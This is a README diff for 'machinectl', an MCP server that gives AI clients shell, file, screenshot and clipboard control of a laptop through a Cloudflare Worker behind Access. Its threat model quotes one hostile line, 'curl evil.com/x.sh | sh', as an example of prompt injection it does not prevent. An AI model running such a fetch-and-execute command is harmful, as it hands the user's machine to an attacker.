@@ -1,390 +1,220 @@
 # machinectl
 
-Remote machine control for AI assistants.
+Your laptop, as an MCP server. Reachable from Access-authenticated MCP clients, gated by Cloudflare Access, and audited at the Worker boundary.
 
-MCP server that lets AI control your machine — anywhere, from any device. Full audit logging, real-time activity feed, and cross-platform tools. Works with Claude, GPT, and any MCP-compatible client.
+> **Deployment note:** the default endpoint in this repository is the author's `my.ax.cloudflare.dev` Worker deployment. The daemon is useful to other operators when paired with a compatible Worker-side `MachineHost` endpoint and their own Cloudflare Access policy. No Cloudflare affiliation or support is implied.
 
-## install
+## What changed from the prototype
 
-### option 1: download binary (easiest)
+The original machinectl bound a local port and pushed a Cloudflare quick tunnel up so an MCP client could reach in. That meant:
 
-grab the latest release for your platform from [releases](https://github.com/acoyfellow/machinectl/releases):
+- The tunnel URL was the secret. Auth = "don't share the URL."
+- The local daemon was the audit boundary. Lose the daemon, lose the trail.
+- Anyone who learned the URL had a remote shell on your laptop.
 
-```bash
-# macos apple silicon
-curl -L https://github.com/acoyfellow/machinectl/releases/latest/download/machinectl-macos-arm64 -o machinectl
-chmod +x machinectl
+**This version inverts that.** No inbound port, no public tunnel. The laptop daemon opens an outbound WebSocket to a Cloudflare Worker. The Worker is the MCP endpoint, sits behind Cloudflare Access, and writes an audit receipt for every tool call to KV. The laptop is just the runtime — auth, transport, and audit all live in front of it.
 
-# macos intel
-curl -L https://github.com/acoyfellow/machinectl/releases/latest/download/machinectl-macos-x64 -o machinectl
-chmod +x machinectl
-
-# linux
-curl -L https://github.com/acoyfellow/machinectl/releases/latest/download/machinectl-linux-x64 -o machinectl
-chmod +x machinectl
+```
+                       ┌──────────────────────────────┐
+                       │ MCP client                   │
+                       │ (Claude.ai / my-ax / etc)    │
+                       └──────────────┬───────────────┘
+                                      │ POST /machinectl/mcp
+                                      │ (Cloudflare Access JWT)
+                                      ▼
+                       ┌──────────────────────────────┐
+                       │ my.ax.cloudflare.dev Worker  │
+                       │  • Access app gate           │
+                       │  • per-user MachineHost DO   │
+                       │  • AUDIT_KV receipts         │
+                       └──────────────┬───────────────┘
+                                      │ WebSocket (outbound from laptop)
+                                      │ keyed by Access email
+                       ┌──────────────▼───────────────┐
+                       │ machinectl daemon            │
+                       │ (this repo, on your laptop)  │
+                       │  • allow-listed tools        │
+                       │  • path-restricted FS access │
+                       └──────────────────────────────┘
 ```
 
-### option 2: from source
+Close your laptop → WS drops → tools auto-disappear from MCP `tools/list`. No "tunnel I forgot was open."
+
+## Install
 
 ```bash
-git clone https://github.com/acoyfellow/machinectl
-cd machinectl
-bun install
-bun run build
+git clone https://github.com/acoyfellow/machinectl ~/cloudflare/machinectl
+cd ~/cloudflare/machinectl
+npm install
+npm run build
 ```
 
-## quick start
-
-just run it. tunnel starts automatically.
+You need `cloudflared` installed locally so the daemon can fetch your Access JWT. Install once:
 
 ```bash
-./machinectl
-```
-
-open `http://localhost:7331/ui` in your browser to see the tunnel URL and MCP endpoint.
-
-**that's it.** one command, everything works.
-
-## tunnel options
-
-by default, machinectl starts a quick tunnel (random URL). customize with env vars:
-
-### quick tunnel (default, random URL)
-
-```bash
-./machinectl
-```
-
-or explicitly:
-
-```bash
-MACHINECTL_TUNNEL= ./machinectl
-```
-
-### named tunnel (stable URL)
-
-for a URL that never changes, set up a named tunnel with your own domain.
-
-**1. install cloudflared**
-
-```bash
-# macos
 brew install cloudflared
-
-# linux
-# see: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/
 ```
 
-**2. login to cloudflare**
+## First-time auth
 
 ```bash
-cloudflared tunnel login
+cloudflared access login https://my.ax.cloudflare.dev
 ```
 
-this opens a browser to authenticate. select the domain you want to use.
+Opens a browser, you SSO with Cloudflare, the JWT lands in `~/.cloudflared/`. The daemon reads it from there. Re-run if the JWT expires (typically every ~24h depending on the Access policy).
 
-**3. create the tunnel**
+## Run
+
+`MACHINECTL_ALLOWED_PATHS` is a comma-separated list of **absolute directory prefixes** the filesystem tools (`read_file`, `write_file`, `list_directory`) and local coding-agent sessions are allowed to touch. It has zero relationship to where the daemon binary itself lives.
 
 ```bash
-cloudflared tunnel create machinectl
+# Allow filesystem tools to operate inside your work + personal project trees.
+MACHINECTL_ALLOWED_PATHS=/Users/you/cloudflare,/Users/you/projects \
+  ~/cloudflare/machinectl/dist/index.js
 ```
 
-note the tunnel ID (e.g., `67b44024-1cdd-4bea-82a9-edecfe5d4829`).
-
-**4. create config file**
-
-create `~/.cloudflared/config.yml`:
-
-```yaml
-tunnel: YOUR_TUNNEL_ID
-credentials-file: /path/to/.cloudflared/YOUR_TUNNEL_ID.json
-
-ingress:
-  - hostname: machinectl.yourdomain.com
-    service: http://localhost:7331
-  - service: http_status:404
-```
-
-replace:
-- `YOUR_TUNNEL_ID` with your tunnel ID
-- `machinectl.yourdomain.com` with your subdomain
-- update the credentials-file path (usually `~/.cloudflared/YOUR_TUNNEL_ID.json`)
-
-**5. add DNS record**
-
-in cloudflare dashboard → DNS → Records:
-
-| Type | Name | Content | Proxy |
-|------|------|---------|-------|
-| CNAME | machinectl | YOUR_TUNNEL_ID.cfargotunnel.com | Proxied |
-
-or via CLI:
+Want to open it to your whole home dir? Sure — but think about what's in there (`.ssh/`, `.aws/`, browser sessions, etc.) before you do:
 
 ```bash
-cloudflared tunnel route dns machinectl machinectl.yourdomain.com
+MACHINECTL_ALLOWED_PATHS=$HOME ~/cloudflare/machinectl/dist/index.js
 ```
 
-**6. run machinectl**
+Want the daemon to run, but filesystem tools to refuse? Just leave the var unset:
 
 ```bash
-MACHINECTL_TUNNEL=machinectl ./machinectl
+~/cloudflare/machinectl/dist/index.js
+# → [!] filesystem and agent-session tools are DISABLED
+# → [!] set MACHINECTL_ALLOWED_PATHS=/abs/path1,/abs/path2 and restart to enable
 ```
 
-your stable URL is now `https://machinectl.yourdomain.com/mcp`.
+`exec_command` and `git` always register. Their *optional* `cwd` argument is path-gated if you supply one; without `cwd`, they run in the daemon's PWD. Local-agent controls (`agent_*`) register only when allowed paths are configured, because every new pi/OpenCode process must start in an explicitly scoped repository. The other tools (`screenshot`, `processes`, `clipboard`, `notify`, `open` with a URL) aren't filesystem-bound and are unaffected.
 
-### local only (no tunnel)
+Output on a successful connect:
+
+```
+[machinectl] machinectl daemon — machine: "your-macbook"
+[machinectl] worker: https://my.ax.cloudflare.dev
+[machinectl] tools registered: exec_command, git, agent_start, agent_list, agent_status, agent_logs, agent_prompt, agent_steer, agent_follow_up, agent_pi_command, agent_abort, agent_stop, read_file, write_file, list_directory, screenshot, processes, clipboard, notify, open
+[machinectl] connecting to wss://my.ax.cloudflare.dev/machinectl/connect as "your-macbook"
+[machinectl] connected; publishing tool catalog
+```
+
+Any MCP client that hits `https://my.ax.cloudflare.dev/machinectl/mcp` through the applicable Cloudflare Access policy sees the currently connected tool catalog and can call it. The call lands at the Worker, gets audited, gets pushed down your WebSocket, runs on your laptop, and returns through the same path.
+
+## Config
+
+| Env var | Default | What it does |
+|---|---|---|
+| `MACHINECTL_URL` | `https://my.ax.cloudflare.dev` | Worker base. Override for dev or for a separate deployment. |
+| `MACHINECTL_NAME` | `os.hostname()` | Human-readable machine name surfaced in the catalog + audit logs. |
+| `MACHINECTL_ALLOWED_PATHS` | (empty) | Comma-separated absolute directory prefixes the filesystem tools (`read_file`, `write_file`, `list_directory`) and local coding-agent sessions may touch. **Filesystem and `agent_*` tools refuse to register if empty.** Multiple paths: `MACHINECTL_ALLOWED_PATHS=/Users/me/work,/Users/me/projects,/tmp/scratch`. Unrelated to where the daemon binary lives. |
+| `MACHINECTL_EXEC_TIMEOUT` | `60000` | Per-call timeout in ms for `exec_command` and `git`. Max 5 minutes hard cap. |
+| `MACHINECTL_ACCESS_TOKEN` | (unset) | Override for the Access JWT instead of pulling from cloudflared. Useful in CI / containers. |
+| `MACHINECTL_AGENT_MAX_SESSIONS` | `4` | Maximum concurrently active local pi/OpenCode sessions. Min 1, max 32. |
+| `MACHINECTL_AGENT_MAX_RUNTIME_MS` | `7200000` | Hard lifetime limit per local coding-agent session (default 2 hours; min 1 minute, max 24 hours). |
+| `MACHINECTL_AGENT_STOP_GRACE_MS` | `5000` | Grace period after SIGTERM before the agent process group is SIGKILLed. |
+
+## Tools
+
+| Tool | Description | Path-gated |
+|---|---|---|
+| `exec_command` | Run a shell command. Captures stdout/stderr/exit. 256KB output cap. Timeout from `MACHINECTL_EXEC_TIMEOUT`. | Optional cwd is gated. |
+| `git` | Allow-listed git subcommands (status, diff, log, show, add, commit, push, pull, fetch, branch, stash, rebase, merge, cherry-pick, reset, revert, tag, blame, remote, config, rev-parse, describe, switch, checkout). | Optional cwd is gated. |
+| `read_file` | Read a file (utf-8). Up to 256KB; larger files truncated with a notice. | Yes |
+| `write_file` | Write content to a file. Creates parent dirs. Overwrites. | Yes |
+| `list_directory` | List a directory. Set `recursive=true` and `maxDepth` (1–8, default 3) to walk children. | Yes |
+| `screenshot` | Capture the screen, return base64 PNG. macOS: `screencapture`. Linux: `grim`/`scrot`. | No |
+| `processes` | Top N processes by cpu or memory. | No |
+| `clipboard` | Read/write the system clipboard. macOS: `pbpaste`/`pbcopy`. Linux: `wl-copy` / `xclip`. | No |
+| `notify` | Send a system notification. macOS: `osascript`. Linux: `notify-send`. | No |
+| `open` | Open a URL or file in the system default handler. URLs are unrestricted; file paths are gated. | Path arg gated. |
+| `agent_start` | Start a local `pi` session over RPC, or a captured bounded `opencode run` job. | Requires a `cwd` inside configured allowed paths. |
+| `agent_list` / `agent_status` / `agent_logs` | Inspect active sessions, structured pi events, captured output, and optionally recent saved pi sessions for resume. | No additional path access. |
+| `agent_prompt` / `agent_steer` / `agent_follow_up` | Prompt or steer a live pi RPC session. | Existing session only. |
+| `agent_pi_command` | Run allow-listed pi controls: state/messages/stats, model/thinking changes, compact, switch/fork/clone/export. | Existing session only. |
+| `agent_abort` / `agent_stop` | Interrupt active work or stop the local agent process. | Existing session only. |
+
+## Local coding agents
+
+`machinectl` can act as a remote control plane for coding agents already authenticated and configured on your laptop.
+
+### pi: live, steerable sessions
+
+`agent_start({ agent: "pi", cwd: "/absolute/repo", prompt: "..." })` starts `pi --mode rpc` locally and returns a machinectl session id. That session remains alive in the daemon so an MCP caller can subsequently:
+
+- list recent persisted pi sessions with `agent_list({ includePersistedPi: true })` and reopen one via `agent_start({ agent: "pi", session: "<id-or-path>", ... })`
+- send more work with `agent_prompt`
+- steer in-flight work with `agent_steer`
+- queue later work with `agent_follow_up`
+- inspect events/transcript/state with `agent_status` and `agent_pi_command`
+- change model or thinking level with `agent_pi_command`
+- abort or stop it with `agent_abort` / `agent_stop`
+
+Example sequence from an MCP caller:
+
+```text
+agent_start({agent:"pi", cwd:"/Users/me/cloudflare/my-ax", prompt:"inspect the failing tests and fix them"})
+agent_status({id:"<returned id>"})
+agent_steer({id:"<returned id>", message:"do not modify migrations; keep the fix in UI code"})
+agent_pi_command({id:"<returned id>", command:"get_last_assistant_text"})
+```
+
+### OpenCode: captured bounded jobs
+
+`agent_start({ agent: "opencode", cwd: "/absolute/repo", prompt: "..." })` starts `opencode run --format json` and captures its output. Poll it with `agent_status` / `agent_logs` or stop it with `agent_stop`. Live prompt/steer controls are deliberately pi-only until OpenCode's programmatic session transport is integrated.
+
+Agent processes inherit the daemon's user environment and local CLI credentials. `agent_start` refuses to run unless `MACHINECTL_ALLOWED_PATHS` is configured and its `cwd` falls within one of those roots. Saved pi-session discovery only exposes sessions whose original `cwd` remains inside those roots; explicit session paths, `switch_session`, and `export_html` output paths are likewise gated. Agent processes are capped by count and runtime, are stopped as process groups, and are terminated when the daemon shuts down. Restrict who can access the MCP endpoint accordingly.
+
+## Audit
+
+Every tool call writes a receipt to `AUDIT_KV` on the Worker side, keyed `machinectl:<email>:<ts>:<rand>`, 90-day TTL. Receipts include: timestamp, tool name, args, ok/error, content preview (capped at 2 KB so screenshots don't blow up the KV entry). No local audit file — the source of truth is the Worker.
+
+Inspect receipts via the Worker's existing audit UI or via `wrangler kv key list --namespace-id <AUDIT_KV>`. (List/inspect tooling for `machinectl:` prefix is a TODO in the my-ax UI.)
+
+## What's intentionally limited
+
+- **No `MACHINECTL_TOKEN` / bearer-token-as-URL.** Access JWT is the auth. There is no fallback. Lose `cloudflared`, you can't connect.
+- **No quick tunnel.** No public URL to leak.
+- **No local dashboard.** The Worker's audit is the dashboard. No half-orphan UI on `localhost:7331` to forget about.
+- **`exec_command` is full shell, by design.** It's audited end-to-end and gated by Access in front. If you want a more restricted variant, narrow `git`'s subcommand allow-list as a model and copy the pattern.
+- **Filesystem and `agent_*` tools refuse to register without `MACHINECTL_ALLOWED_PATHS`.** No `$HOME` default. Forces deliberate scoping.
+- **One laptop per user at a time.** Latest WS connection wins; previous gets a clean close. If you connect from your work laptop while your home laptop is already up, the home laptop disconnects.
+
+## Threat model (honest)
+
+The blast radius of `exec_command` is the same as any LLM-driven terminal you're already using on this machine (Claude Code, OpenCode, Codex, etc.). If you trust an LLM with shell access in *that* context, `machinectl` with `exec_command` is **strictly better**:
+
+- Caller identity is the verified Cloudflare Access identity, not "the assistant" with no attribution attached.
+- Every tool call writes a structured audit receipt to `AUDIT_KV` with 90-day TTL. Easy to grep, easy to alert on.
+- Path-touching tools (`read_file`, `write_file`, `list_directory`, `open` with a file path, `exec_command` with a `cwd`) are scoped to `MACHINECTL_ALLOWED_PATHS` with realpath enforcement against symlink escapes.
+- No inbound port. No public URL. The only thing reachable from the internet is the Worker, behind Access.
+
+What it does **not** defend against:
+- A compromised laptop. If `~/.cloudflared/*.json` is stolen, the attacker can impersonate you until the JWT expires. Same as every other Access-protected service you use.
+- Prompt injection convincing the agent to run `curl evil.com/x.sh | sh`. The audit log shows you (under your identity) did it; it doesn't prevent it. This is the existing trust model of every LLM-with-shell tool. machinectl makes it auditable, not impossible.
+- An LLM you don't trust. The threat model assumes the LLM-on-the-other-end is operating in your interest. If it isn't, no audit log saves you.
+
+If you wouldn't run a long-lived terminal session with an LLM that has shell access on this machine, don't run `machinectl` either. If you would (and increasingly most of us do), `machinectl` is the same surface area with better attribution and better audit.
+
+## Multi-machine
+
+The current design is single-machine-per-user. The MCP catalog the Worker exposes is whatever that one connected laptop publishes. The wire format already includes a `machineName` in the `hello` frame, so multi-machine routing (for example a per-call `machine` argument) is a straightforward extension, but is not implemented yet.
+
+## Development
 
 ```bash
-MACHINECTL_TUNNEL=false ./machinectl
+npm install
+npm run typecheck
+npm test
+npm run dev
 ```
 
-useful for local development or when you're already behind a VPN/proxy.
+The Worker-side relay is not bundled into this npm package. To run your own endpoint, implement the outbound WebSocket and MCP routing contract documented by `src/protocol.ts`, place it behind an Access policy, and set `MACHINECTL_URL` to that deployment.
 
-see [cloudflare tunnel docs](https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/) for more details.
+## Security reporting
 
-## connect to claude.ai
+This project deliberately provides remote shell-equivalent capability when `exec_command` is enabled (it is enabled by default). Do not run it against an Access endpoint you do not control or trust. If you find a vulnerability in authentication, routing, path enforcement, or audit behavior, please open a GitHub security advisory rather than a public exploit issue.
 
-1. go to [claude.ai](https://claude.ai) → settings → integrations
-2. click "add custom connector"
-3. enter your URL: `https://your-tunnel-url/mcp`
-4. click Add
+## License
 
-done. now you can control your laptop from claude.ai on any device.
-
-## tools
-
-| tool | description | platform |
-|------|-------------|----------|
-| `screenshot` | Capture screen, returns base64-encoded PNG | macOS, Linux |
-| `exec` | Run any shell command | All |
-| `read_file` | Read file contents | All |
-| `write_file` | Write to file (creates parent dirs) | All |
-| `list_directory` | List files/dirs (optional recursion, max depth 3) | All |
-| `git` | Run git commands | All |
-| `clipboard` | Read or write system clipboard | macOS, Linux |
-| `notify` | Send system notification | macOS, Linux |
-| `processes` | List top processes by CPU or memory | All |
-
-### Tool Examples
-
-**screenshot**
-```typescript
-// No args - captures entire screen
-screenshot()
-```
-
-**exec**
-```typescript
-exec({ command: "ls -la", cwd: "/Users/me/projects" })
-```
-
-**read_file**
-```typescript
-read_file({ path: "/Users/me/projects/app/package.json" })
-```
-
-**write_file**
-```typescript
-write_file({ path: "/tmp/test.txt", content: "Hello world" })
-```
-
-**list_directory**
-```typescript
-list_directory({ path: "/Users/me/projects", recursive: true })
-```
-
-**git**
-```typescript
-git({ args: "status", cwd: "/Users/me/projects/app" })
-git({ args: 'commit -m "fix bug"' })
-```
-
-**clipboard**
-```typescript
-clipboard({ action: "read" })
-clipboard({ action: "write", content: "Hello from AI" })
-```
-
-**notify**
-```typescript
-notify({ title: "Task Complete", message: "Your app is ready" })
-```
-
-**processes**
-```typescript
-processes({ sortBy: "cpu", limit: 10 })
-processes({ sortBy: "memory", limit: 5 })
-```
-
-## use cases
-
-### 1. "Spin up a new app" (Hero Use Case)
-
-> Prompt: "Create a new remote app called wishlist and start the dev server"
-
-Claude runs:
-```bash
-bun create remote-app wishlist
-cd ~/wishlist
-echo 'ALCHEMY_PASSWORD=generated-pw' > .env
-echo 'BETTER_AUTH_SECRET=generated-secret' >> .env
-bun install
-bun dev
-```
-
-Returns: "Your app is running at http://localhost:5173 - SvelteKit + Better Auth + Durable Objects ready to go."
-
-This is the money shot: Claude scaffolds YOUR preferred stack (not generic create-next-app), wires up secrets, starts the server. From your phone.
-
-### 2. "What's using all my CPU?"
-
-> Prompt: "What processes are using the most CPU on my machine?"
-
-Claude uses the `processes` tool to identify resource hogs instantly.
-
-### 3. "Commit my work"
-
-> Prompt: "Look at my uncommitted changes and commit them with good messages"
-
-Claude reads git status, analyzes diffs, groups related changes, writes meaningful commit messages, commits and pushes.
-
-### 4. "Find that file"
-
-> Prompt: "Find the Python script I wrote last week about parsing JSON"
-
-Claude searches your projects using `list_directory` and `read_file`, finds matching files, shows you the path and preview.
-
-### 5. "Fix my broken deploy"
-
-> Prompt: "Take a screenshot, check the logs in ~/app/logs, and help me fix it"
-
-Claude captures your screen, reads error logs, analyzes the issue, proposes fixes, applies them, redeploys.
-
-## config
-
-environment variables:
-
-| var | description | default |
-|-----|-------------|---------|
-| `PORT` | server port | 7331 |
-| `MACHINECTL_TOKEN` | bearer token for auth (optional) | disabled |
-| `MACHINECTL_TUNNEL` | tunnel mode: unset=quick, `false`=disabled, `name`=named tunnel | quick tunnel |
-| `MACHINECTL_ALLOWED_PATHS` | comma-separated allowed paths | `$HOME` |
-| `MACHINECTL_ALLOWED_ORIGINS` | comma-separated CORS origins | `*.trycloudflare.com` |
-| `EXEC_TIMEOUT` | command timeout in ms | 60000 |
-
-example:
-
-```bash
-PORT=8080 MACHINECTL_ALLOWED_PATHS=/Users/me,/tmp ./machinectl
-```
-
-## api reference
-
-### Dashboard
-
-- `GET /ui` - Web dashboard with real-time activity feed
-- `GET /health` - Health check endpoint
-
-### Logs API
-
-- `GET /api/logs?limit=50` - Get last N action logs (JSON)
-- `GET /api/logs/stream` - SSE stream of new logs (real-time)
-- `POST /api/logs/export` - Download full session as JSON
-
-All actions are logged with:
-- Tool name and arguments
-- Result or error
-- Duration
-- Timestamp
-
-## architecture
-
-### Tool System
-
-All tools are wrapped with `withLogging()` which:
-- Records every action to in-memory log
-- Broadcasts to SSE subscribers (dashboard)
-- Tracks duration and errors
-- Enables future persistence/webhooks/analytics
-
-### Adding a New Tool
-
-```typescript
-mcpServer.registerTool("my_tool", {
-  description: "What it does. Platform: macOS, Linux.",
-  inputSchema: {
-    arg1: z.string().describe("Description"),
-  },
-}, withLogging("my_tool", async ({ arg1 }) => {
-  // Your implementation
-  return text("Success");
-}));
-```
-
-The `withLogging` wrapper automatically:
-- Logs the action
-- Handles errors
-- Broadcasts to dashboard
-- Tracks performance
-
-### Platform Detection
-
-Tools detect platform via `os.platform()`:
-- `"darwin"` - macOS
-- `"linux"` - Linux
-- Graceful degradation for unsupported platforms
-
-### Extension Points
-
-- **Action logs**: Can be persisted to file/DB, sent to webhooks, analyzed
-- **SSE infrastructure**: Enables mobile companion, multi-client dashboards
-- **Tool middleware**: Rate limiting, approval workflows, custom validation
-- **Platform detection**: Windows support, container detection, SSH remoting
-
-## security
-
-machinectl gives full access to your machine within allowed paths. keep your tunnel URL private.
-
-- File operations restricted to `MACHINECTL_ALLOWED_PATHS` (default: home directory)
-- Optional bearer token auth via `MACHINECTL_TOKEN` (in URL path)
-- CORS restricted to tunnel domains by default
-- All actions logged and visible in dashboard
-- Session export available for audit trails
-
-## requirements
-
-- macos or linux (for screenshot)
-- [cloudflared](https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/) installed (auto-starts tunnel, or set `MACHINECTL_TUNNEL=false` to disable)
-
-## dev
-
-```bash
-bun install
-bun dev          # run with watch mode
-bun run build    # compile binary
-bun run build:all # compile for all platforms
-```
-
-### Project Structure
-
-- `src/index.ts` - Main server file (single file, ~850 lines)
-  - MCP server setup
-  - Tool definitions
-  - Hono HTTP server
-  - Dashboard UI
-  - Logging system
-
-### Contributing
-
-To add a new tool:
-
-1. Define the tool schema with Zod
-2. Wrap handler with `withLogging(toolName, handler)`
-3. Add platform detection if needed
-4. Update README tools table
-5. Add example to use cases section
-
-## license
-
-MIT
+MIT. See [LICENSE](./LICENSE).
